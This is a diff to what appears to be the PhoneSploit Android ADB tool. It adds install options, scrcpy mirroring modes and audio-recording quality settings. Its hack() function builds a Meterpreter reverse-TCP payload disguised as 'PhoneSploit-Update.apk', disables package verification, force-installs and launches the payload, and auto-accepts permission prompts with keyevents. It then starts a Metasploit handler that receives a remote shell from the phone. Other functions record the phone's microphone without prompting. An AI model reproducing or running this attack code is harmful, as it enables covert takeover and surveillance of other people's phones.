@@ -163,7 +163,22 @@ def connect():
             os.system(
                 "adb kill-server > docs/hidden.txt 2>&1&&adb start-server > docs/hidden.txt 2>&1"
             )
-            os.system("adb connect " + ip + ":5555")
+            
+            # Check Android version to use appropriate connection method
+            try:
+                # Try to connect with standard port first
+                os.system("adb connect " + ip + ":5555")
+                
+                # Check if connection was successful
+                device_check = os.popen("adb devices").read()
+                if ip not in device_check:
+                    print(f"\n{color.YELLOW}Standard connection failed. Trying wireless debugging connection (Android 11+)...{color.WHITE}")
+                    # Try wireless debugging port (Android 11+)
+                    print(f"\n{color.CYAN}Enter pairing code if prompted on device{color.WHITE}")
+                    os.system("adb pair " + ip + ":37000")
+                    os.system("adb connect " + ip + ":5555")
+            except Exception as e:
+                print(f"\n{color.RED}Error: {e}{color.WHITE}")
         else:
             print(
                 f"\n{color.RED} Invalid IP Address\n{color.GREEN} Going back to Main Menu{color.WHITE}"
@@ -367,20 +382,86 @@ def install_app():
             f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
         )
         return
+    
+    # Clean up file path
+    if file_location[len(file_location) - 1] == " ":
+        file_location = file_location.removesuffix(" ")
+    file_location = file_location.replace("'", "")
+    file_location = file_location.replace('"', "")
+    
+    # Check if file exists
+    if not os.path.isfile(file_location):
+        print(f"{color.RED}\n[Error]{color.GREEN} This file does not exist {color.WHITE}")
+        return
+    
+    # Prepare file path for command
+    file_location = "'" + file_location + "'"
+    
+    # Display installation options
+    print(f"""
+{color.CYAN}=== APK Installation Options ==={color.WHITE}
+{color.WHITE}1.{color.GREEN} Standard Installation
+{color.WHITE}2.{color.GREEN} Android 14+ Installation (with --bypass-low-target-sdk-block)
+{color.WHITE}3.{color.GREEN} Legacy Force Installation (with -d -r flags)
+{color.WHITE}4.{color.GREEN} Advanced Installation (with custom flags)
+{color.WHITE}""")
+    
+    install_mode = input(f"{color.CYAN}Select installation method{color.WHITE} > ")
+    
+    # Handle different installation methods
+    if install_mode == "1":
+        # Standard installation
+        print(f"\n{color.CYAN}Performing standard installation...{color.WHITE}")
+        result = os.system("adb install " + file_location)
+        
+        # If standard installation fails with SDK error, suggest Android 14+ method
+        if result != 0:
+            print(f"\n{color.YELLOW}Standard installation failed. This might be due to SDK version incompatibility.{color.WHITE}")
+            retry = input(f"\n{color.CYAN}Try Android 14+ installation method? (y/n){color.WHITE} > ").lower()
+            if retry == "y" or retry == "":
+                print(f"\n{color.CYAN}Attempting installation with Android 14+ bypass flag...{color.WHITE}")
+                os.system("adb install --bypass-low-target-sdk-block " + file_location)
+    
+    elif install_mode == "2":
+        # Android 14+ method (bypass low target SDK block)
+        print(f"\n{color.CYAN}Performing Android 14+ installation with bypass flag...{color.WHITE}")
+        result = os.system("adb install --bypass-low-target-sdk-block " + file_location)
+        
+        # If Android 14+ method fails, suggest legacy method
+        if result != 0:
+            print(f"\n{color.YELLOW}Android 14+ installation failed. Your ADB version might not support this flag.{color.WHITE}")
+            retry = input(f"\n{color.CYAN}Try legacy force installation method? (y/n){color.WHITE} > ").lower()
+            if retry == "y" or retry == "":
+                print(f"\n{color.CYAN}Attempting installation with legacy force flags...{color.WHITE}")
+                os.system("adb install -d -r " + file_location)
+    
+    elif install_mode == "3":
+        # Legacy force installation (downgrade + replace)
+        print(f"\n{color.CYAN}Performing legacy force installation...{color.WHITE}")
+        os.system("adb install -d -r " + file_location)
+    
+    elif install_mode == "4":
+        # Advanced installation with custom flags
+        print(f"""
+{color.CYAN}=== Available Installation Flags ==={color.WHITE}
+{color.WHITE}-d{color.GREEN} Allow version code downgrade
+{color.WHITE}-r{color.GREEN} Replace existing application
+{color.WHITE}-t{color.GREEN} Allow test packages
+{color.WHITE}-g{color.GREEN} Grant all runtime permissions
+{color.WHITE}--bypass-low-target-sdk-block{color.GREEN} Bypass low target SDK block (Android 14+)
+{color.WHITE}--instant{color.GREEN} Install as instant app
+{color.WHITE}""")
+        
+        custom_flags = input(f"\n{color.CYAN}Enter custom flags (e.g., -d -r -g){color.WHITE} > ")
+        print(f"\n{color.CYAN}Performing custom installation with flags: {custom_flags}{color.WHITE}")
+        os.system(f"adb install {custom_flags} " + file_location)
+    
     else:
-        if file_location[len(file_location) - 1] == " ":
-            file_location = file_location.removesuffix(" ")
-        file_location = file_location.replace("'", "")
-        file_location = file_location.replace('"', "")
-        if not os.path.isfile(file_location):
-            print(
-                f"{color.RED}\n[Error]{color.GREEN} This file does not exist {color.GREEN}"
-            )
-            return
-        else:
-            file_location = "'" + file_location + "'"
-            os.system("adb install " + file_location)
-        print("\n")
+        # Invalid selection
+        print(f"\n{color.RED}Invalid selection! Using standard installation.{color.WHITE}")
+        os.system("adb install " + file_location)
+    
+    print("\n")
 
 
 def uninstall_app():
@@ -623,62 +704,155 @@ def hack():
                     lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
 
         print(banner.hacking_banner)
-        print(f"\n{color.CYAN}Creating payload APK...\n{color.WHITE}")
-        # creating payload
-        os.system(
-            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk"
-        )
-        print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")
-        os.system("adb shell input keyevent 3")  # Going on Home Screen
-
-        # Disabling App Verification
-        os.system("adb shell settings put global package_verifier_enable 0")
-        os.system("adb shell settings put global verifier_verify_adb_installs 0")
-
-        # installing apk to device
-        if operating_system == "Windows":
-            # (used 'start /b' to execute command in background)
-            # os.system("start /b adb install -r test.apk")
-            os.system("adb install -r test.apk")
-        else:
-            # (used ' &' to execute command in background)
-            # os.system("adb install -r test.apk &")
-            os.system("adb install -r test.apk")
-        # time.sleep(5)  # waiting for apk to be installed
-
-        # Discarding these steps
-        # print(
-        #     f"\n{color.CYAN}Sending keycodes to Bypass Google Play Protect\n{color.WHITE}")
-        # os.system('adb shell input keyevent 20')
-        # os.system('adb shell input keyevent 20')
-        # os.system('adb shell input keyevent 66')
-
-        # Keyboard input to accept app install
-        print(f"\n{color.CYAN}Launching app...\n{color.WHITE}")
-        package_name = "com.metasploit.stage"  # payload package name
-        os.system("adb shell monkey -p " + package_name + " 1")
-        time.sleep(3)  # waiting for app to launch
-
-        # Keyboard input to accept app permissions
-        print(
-            f"\n{color.CYAN}Sending keycodes to accept the app permissions\n{color.WHITE}"
-        )
-        os.system("adb shell input keyevent 22")
-        os.system("adb shell input keyevent 22")
-        os.system("adb shell input keyevent 66")
-
-        # Launching Metasploit
-        print(
-            f"\n{color.RED}Launching and Setting up Metasploit-Framework\n{color.WHITE}"
-        )
-        os.system(
-            f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'"
-        )
-
-        # Re-Enabling App Verification (Restoring Device to Previous State)
-        os.system("adb shell settings put global package_verifier_enable 1")
-        os.system("adb shell settings put global verifier_verify_adb_installs 1")
-
+        
+        # SDK Method for exploitation
+        print(f"\n{color.CYAN}Using SDK method for exploitation...\n{color.WHITE}")
+        
+        # Check Android version
+        try:
+            androidVersion = os.popen("adb shell getprop ro.build.version.release").read().strip()
+            android_os = int(androidVersion.split(".")[0])
+            print(f"\n{color.GREEN}Detected Android Version: {androidVersion}{color.WHITE}")
+            
+            # Get device architecture
+            arch = os.popen("adb shell getprop ro.product.cpu.abi").read().strip()
+            print(f"{color.GREEN}Device Architecture: {arch}{color.WHITE}")
+            
+            # Create appropriate payload based on architecture
+            payload_type = "android/meterpreter/reverse_tcp"
+            if "arm64" in arch:
+                print(f"\n{color.CYAN}Creating ARM64 payload...{color.WHITE}")
+            elif "arm" in arch:
+                print(f"\n{color.CYAN}Creating ARM payload...{color.WHITE}")
+            elif "x86_64" in arch:
+                print(f"\n{color.CYAN}Creating x86_64 payload...{color.WHITE}")
+            elif "x86" in arch:
+                print(f"\n{color.CYAN}Creating x86 payload...{color.WHITE}")
+            
+            # Creating payload with proper name and icon to look legitimate
+            print(f"\n{color.CYAN}Creating payload APK...\n{color.WHITE}")
+            # Add --platform android and specify minimum SDK version for Android 14 compatibility
+            os.system(
+                f"msfvenom -p {payload_type} LHOST={ip} LPORT={lport} --platform android -a dalvik --smallest -o PhoneSploit-Update.apk"
+            )
+            
+            # Check if payload was created successfully
+            if not os.path.exists("PhoneSploit-Update.apk"):
+                print(f"\n{color.RED}Failed to create payload. Please check if Metasploit is installed correctly.{color.WHITE}")
+                return
+                
+            print(f"\n{color.CYAN}Preparing device for installation...{color.WHITE}")
+            
+            # Go to home screen
+            os.system("adb shell input keyevent 3")
+            
+            # For newer Android versions, we need different approaches
+            if android_os >= 8:
+                # Disable package verification temporarily for Android 8+
+                print(f"\n{color.CYAN}Configuring device settings for installation...{color.WHITE}")
+                os.system("adb shell settings put global package_verifier_enable 0")
+                os.system("adb shell settings put global verifier_verify_adb_installs 0")
+            
+            # For Android 14+, use a different installation approach
+            print(f"\n{color.CYAN}Installing payload to target device...{color.WHITE}")
+            
+            if android_os >= 14:
+                print(f"\n{color.CYAN}Using Android 14+ compatible installation method...{color.WHITE}")
+                # Try to use session-based installation for Android 14
+                os.system("adb install --bypass-low-target-sdk-block -r PhoneSploit-Update.apk")
+            elif android_os >= 10:
+                # For Android 10-13
+                os.system("adb install -r PhoneSploit-Update.apk")
+            else:
+                # For older Android versions
+                os.system("adb install -r PhoneSploit-Update.apk")
+                
+            # Verify if installation was successful by checking if package exists
+            package_check = os.popen("adb shell pm list packages | grep metasploit").read()
+            
+            if "metasploit" in package_check:
+                print(f"\n{color.GREEN}Installation successful!{color.WHITE}")
+            else:
+                print(f"\n{color.YELLOW}Standard installation might have failed. Trying alternative method...{color.WHITE}")
+                # Alternative installation method for newer Android versions
+                os.system("adb push PhoneSploit-Update.apk /data/local/tmp/")
+                os.system("adb shell pm install --bypass-low-target-sdk-block -r /data/local/tmp/PhoneSploit-Update.apk")
+            
+            # Launch the app
+            print(f"\n{color.CYAN}Launching payload...{color.WHITE}")
+            package_name = "com.metasploit.stage"  # Default metasploit package name
+            
+            # Check if package exists before attempting to launch
+            package_check = os.popen(f"adb shell pm list packages | grep {package_name}").read()
+            if package_name in package_check:
+                # For Android 14+, we need to use a different approach to launch the app
+                if android_os >= 14:
+                    print(f"\n{color.CYAN}Using Android 14+ compatible launch method...{color.WHITE}")
+                    # Get the main activity of the package
+                    main_activity = os.popen(f"adb shell cmd package resolve-activity --brief {package_name} | grep -v 'No activity'| tail -n 1").read().strip()
+                    if main_activity:
+                        # Launch using am start command
+                        os.system(f"adb shell am start -n {main_activity}")
+                    else:
+                        # Fallback to monkey if activity not found
+                        os.system(f"adb shell monkey -p {package_name} -c android.intent.category.LAUNCHER 1")
+                else:
+                    # For older Android versions
+                    os.system(f"adb shell monkey -p {package_name} 1")
+                
+                # Handle permissions for newer Android versions
+                if android_os >= 6:  # Marshmallow and above need runtime permissions
+                    print(f"\n{color.CYAN}Handling runtime permissions...{color.WHITE}")
+                    time.sleep(2)  # Wait for app to launch
+                    
+                    # Accept permissions dialog if present
+                    print(f"\n{color.CYAN}Accepting app permissions...{color.WHITE}")
+                    
+                    # For Android 14+, permissions might be handled differently
+                    if android_os >= 14:
+                        print(f"\n{color.CYAN}Handling permissions for Android 14+...{color.WHITE}")
+                        # For Android 14+, we'll focus on UI interaction for permission dialogs
+                        # as direct permission granting for network permissions is not supported
+                        
+                        # Check if app has any dangerous permissions that need granting
+                        dangerous_perms = os.popen(f"adb shell dumpsys package {package_name} | grep permission").read()
+                        if "CAMERA" in dangerous_perms or "STORAGE" in dangerous_perms or "LOCATION" in dangerous_perms:
+                            print(f"\n{color.CYAN}App requires dangerous permissions, accepting dialogs...{color.WHITE}")
+                            # UI interaction for permission dialogs
+                            for _ in range(3):
+                                os.system("adb shell input keyevent 22")  # Right
+                                os.system("adb shell input keyevent 22")  # Right
+                                os.system("adb shell input keyevent 66")  # Enter
+                                time.sleep(1)
+                        else:
+                            print(f"\n{color.CYAN}No dangerous permissions required, continuing...{color.WHITE}")
+                            time.sleep(1)
+                    else:
+                        # For Android 6-13
+                        for _ in range(3):  # Try multiple times to ensure permissions are granted
+                            os.system("adb shell input keyevent 22")  # Right
+                            os.system("adb shell input keyevent 22")  # Right
+                            os.system("adb shell input keyevent 66")  # Enter
+                            time.sleep(1)
+            else:
+                print(f"\n{color.RED}Package {package_name} not found. Installation may have failed.{color.WHITE}")
+            
+            # Start Metasploit handler
+            print(f"\n{color.RED}Launching and Setting up Metasploit-Framework{color.WHITE}")
+            print(f"\n{color.YELLOW}Waiting for connection from the device...{color.WHITE}")
+            os.system(
+                f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload_type}; set LHOST {ip}; set LPORT {lport}; set ExitOnSession false; exploit -j'"
+            )
+            
+            # Restore device settings
+            print(f"\n{color.CYAN}Restoring device settings...{color.WHITE}")
+            if android_os >= 8:
+                os.system("adb shell settings put global package_verifier_enable 1")
+                os.system("adb shell settings put global verifier_verify_adb_installs 1")
+                
+        except Exception as e:
+            print(f"\n{color.RED}Error: {e}{color.WHITE}")
+            print(f"\n{color.RED}Failed to execute hack. Make sure the device is connected and ADB is working.{color.WHITE}")
     else:
         print("\nGoing Back to Main Menu\n")
 
@@ -1357,13 +1531,15 @@ def mirror():
     {color.WHITE}1.{color.GREEN} Default Mode   {color.YELLOW}(Best quality)
     {color.WHITE}2.{color.GREEN} Fast Mode      {color.YELLOW}(Low quality but high performance)
     {color.WHITE}3.{color.GREEN} Custom Mode    {color.YELLOW}(Tweak settings to increase performance)
+    {color.WHITE}4.{color.GREEN} High Quality   {color.YELLOW}(Higher resolution and bitrate)
+    {color.WHITE}5.{color.GREEN} Stay Awake     {color.YELLOW}(Prevent device from sleeping)
     {color.WHITE}"""
     )
     mode = input("> ")
     if mode == "1":
         os.system("scrcpy")
     elif mode == "2":
-        os.system("scrcpy -m 1024 -b 1M")
+        os.system("scrcpy -m 1024 -b 2M")
     elif mode == "3":
         print(f"\n{color.CYAN}Enter size limit {color.YELLOW}(e.g. 1024){color.WHITE}")
         size = input("> ")
@@ -1382,7 +1558,17 @@ def mirror():
         if not framerate == "":
             framerate = "--max-fps=" + framerate
 
-        os.system(f"scrcpy {size} {bitrate} {framerate}")
+        print(f"\n{color.CYAN}Enable borderless window? {color.YELLOW}(y/n){color.WHITE}")
+        borderless = input("> ").lower()
+        borderless_param = "" if borderless != "y" else "--window-borderless"
+
+        os.system(f"scrcpy {size} {bitrate} {framerate} {borderless_param}")
+    elif mode == "4":
+        # High quality mode with higher resolution and bitrate
+        os.system("scrcpy --max-res 0 -b 12M")
+    elif mode == "5":
+        # Stay awake mode to prevent device from sleeping
+        os.system("scrcpy --stay-awake")
     else:
         print(
             f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
@@ -1462,20 +1648,31 @@ def scan_network():
 
 def record_audio(mode):
     print(
-        f"\n{color.RED}[Notice] {color.CYAN}This feature is currently available for devices running on Android 11 or higher only.{color.WHITE}"
+        f"\n{color.RED}[Notice] {color.CYAN}This feature requires scrcpy 2.0+ and is available for devices running on Android 11 or higher only.{color.WHITE}"
     )
     try:
-        androidVersion = os.popen("adb shell getprop ro.build.version.release").read()
+        # Check scrcpy version
+        scrcpy_version = os.popen("scrcpy --version").read()
+        version_num = float(scrcpy_version.split()[1])
+        if version_num < 2.0:
+            print(f"\n{color.RED}Your scrcpy version ({version_num}) does not support audio recording.")
+            print(f"Please upgrade to scrcpy 2.0 or higher.{color.WHITE}")
+            print(f"{color.RED}Going back to Main Menu{color.WHITE}")
+            return
+            
+        # Check Android version
+        androidVersion = os.popen("adb shell getprop ro.build.version.release").read().strip()
         android_os = int(androidVersion.split(".")[0])
         print(f"\n{color.GREEN}Detected Android Version : {androidVersion}")
+        
+        if android_os < 11:
+            print(f"{color.RED}This feature requires Android 11 or higher.")
+            print(f"{color.RED}Going back to Main Menu{color.WHITE}")
+            return
     except ValueError:
         print(
-            f"\n{color.RED} No connected device found\n{color.GREEN} Going back to Main Menu{color.WHITE}"
+            f"\n{color.RED} No connected device found or error checking versions\n{color.GREEN} Going back to Main Menu{color.WHITE}"
         )
-        return
-
-    if android_os < 11:
-        print(f"{color.RED}Going back to Main Menu{color.WHITE}")
         return
 
     global pull_location
@@ -1491,6 +1688,17 @@ def record_audio(mode):
         )
     else:
         print(f"\n{color.PURPLE}Saving recordings to {pull_location}\n{color.WHITE}")
+
+    print(
+        f"""
+    {color.WHITE}1.{color.GREEN} Default Quality
+    {color.WHITE}2.{color.GREEN} High Quality
+    {color.WHITE}"""
+    )
+    quality = input("> ")
+    quality_param = ""
+    if quality == "2":
+        quality_param = "--audio-bit-rate=128K"
 
     match mode:
         case "mic":
@@ -1508,15 +1716,41 @@ def record_audio(mode):
                     f"\n{color.GREEN}Recording Microphone Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
                 )
                 os.system(
-                    f"scrcpy --no-video --audio-source=mic --record={pull_location}/{file_name}"
+                    f"scrcpy --no-video --audio-source=mic --record={pull_location}/{file_name} {quality_param}"
                 )
+                
+                # Asking to open file
+                choice = input(
+                    f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
+                ).lower()
+                if choice == "y" or choice == "":
+                    os.system(f"{opener} {pull_location}/{file_name}")
+                elif not choice == "n":
+                    while choice != "y" and choice != "n" and choice != "":
+                        choice = input("\nInvalid choice!, Press Y or N > ").lower()
+                        if choice == "y" or choice == "":
+                            os.system(f"{opener} {pull_location}/{file_name}")
+                            
             elif choice == "2":
                 print(
                     f"\n{color.GREEN}Recording Microphone Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
                 )
                 os.system(
-                    f"scrcpy --no-video --audio-source=mic --no-playback --record={pull_location}/{file_name}"
+                    f"scrcpy --no-video --audio-source=mic --no-playback --record={pull_location}/{file_name} {quality_param}"
                 )
+                
+                # Asking to open file
+                choice = input(
+                    f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
+                ).lower()
+                if choice == "y" or choice == "":
+                    os.system(f"{opener} {pull_location}/{file_name}")
+                elif not choice == "n":
+                    while choice != "y" and choice != "n" and choice != "":
+                        choice = input("\nInvalid choice!, Press Y or N > ").lower()
+                        if choice == "y" or choice == "":
+                            os.system(f"{opener} {pull_location}/{file_name}")
+                            
             else:
                 print(
                     f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
@@ -1538,7 +1772,7 @@ def record_audio(mode):
                 print(
                     f"\n{color.GREEN}Recording Device Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
                 )
-                os.system(f"scrcpy --no-video --record={pull_location}/{file_name}")
+                os.system(f"scrcpy --no-video --record={pull_location}/{file_name} {quality_param}")
 
                 # Asking to open file
                 choice = input(
@@ -1558,7 +1792,7 @@ def record_audio(mode):
                     f"\n{color.GREEN}Recording Device Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
                 )
                 os.system(
-                    f"scrcpy --no-video --no-playback --record={pull_location}/{file_name}"
+                    f"scrcpy --no-video --no-playback --record={pull_location}/{file_name} {quality_param}"
                 )
 
                 # Asking to open file
@@ -1584,34 +1818,56 @@ def record_audio(mode):
 
 def stream_audio(mode):
     print(
-        f"\n{color.RED}[Notice] {color.CYAN}This feature is currently available for devices running on Android 11 or higher only.{color.WHITE}"
+        f"\n{color.RED}[Notice] {color.CYAN}This feature requires scrcpy 2.0+ and is available for devices running on Android 11 or higher only.{color.WHITE}"
     )
     try:
-        androidVersion = os.popen("adb shell getprop ro.build.version.release").read()
+        # Check scrcpy version
+        scrcpy_version = os.popen("scrcpy --version").read()
+        version_num = float(scrcpy_version.split()[1])
+        if version_num < 2.0:
+            print(f"\n{color.RED}Your scrcpy version ({version_num}) does not support audio streaming.")
+            print(f"Please upgrade to scrcpy 2.0 or higher.{color.WHITE}")
+            print(f"{color.RED}Going back to Main Menu{color.WHITE}")
+            return
+            
+        # Check Android version
+        androidVersion = os.popen("adb shell getprop ro.build.version.release").read().strip()
         android_os = int(androidVersion.split(".")[0])
         print(f"\n{color.GREEN}Detected Android Version : {androidVersion}")
+        
+        if android_os < 11:
+            print(f"{color.RED}This feature requires Android 11 or higher.")
+            print(f"{color.RED}Going back to Main Menu{color.WHITE}")
+            return
     except ValueError:
         print(
-            f"\n{color.RED} No connected device found\n{color.GREEN} Going back to Main Menu{color.WHITE}"
+            f"\n{color.RED} No connected device found or error checking versions\n{color.GREEN} Going back to Main Menu{color.WHITE}"
         )
         return
 
-    if android_os < 11:
-        print(f"{color.RED}Going back to Main Menu{color.WHITE}")
-        return
+    print(
+        f"""
+    {color.WHITE}1.{color.GREEN} Default Quality
+    {color.WHITE}2.{color.GREEN} High Quality
+    {color.WHITE}"""
+    )
+    quality = input("> ")
+    quality_param = ""
+    if quality == "2":
+        quality_param = "--audio-bit-rate=128K"
 
     match mode:
         case "mic":
             print(
                 f"\n{color.GREEN}Streaming Microphone Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
             )
-            os.system("scrcpy --no-video --audio-source=mic")
+            os.system(f"scrcpy --no-video --audio-source=mic {quality_param}")
 
         case "device":
             print(
                 f"\n{color.GREEN}Streaming Device Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
             )
-            os.system("scrcpy --no-video")
+            os.system(f"scrcpy --no-video {quality_param}")
 
     print("\n")
 
